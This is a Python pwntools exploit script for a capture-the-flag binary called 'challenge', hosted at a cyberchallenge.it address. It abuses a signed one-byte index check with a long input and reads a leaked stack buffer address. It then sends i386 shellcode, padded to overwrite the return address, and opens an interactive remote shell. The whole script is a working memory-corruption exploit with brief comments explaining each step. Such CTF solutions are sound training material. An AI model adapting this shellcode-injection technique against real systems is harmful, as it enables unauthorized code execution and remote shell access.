#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge")
context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("securitycheck.challs.cyberchallenge.it", 9261)

    return r


def main():
    r = conn()

    enable_debug = b'A' * 0xff
    
    # The check between 'index' and 'MAX' is performed within the first byte of index (SIGNED!)
    # So we can use a long string to produce (with "strlen") a high 'index' and access to functions saved to the stack
    r.sendline(enable_debug)

    r.recvuntil(b'dst is at ')
    buff_addr = bytes.fromhex(r.recvS(8))[::-1]       # Reads address (and reverse it since it's in big-endian)

    log.info(f'Buffer address @ {buff_addr}')

    shell = asm(shellcraft.i386.sh())
    payload = shell + b'A' * (0xfe - len(shell) - 16) + buff_addr + b'A' * 12       # Now EIP will point to the injected shellcode

    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
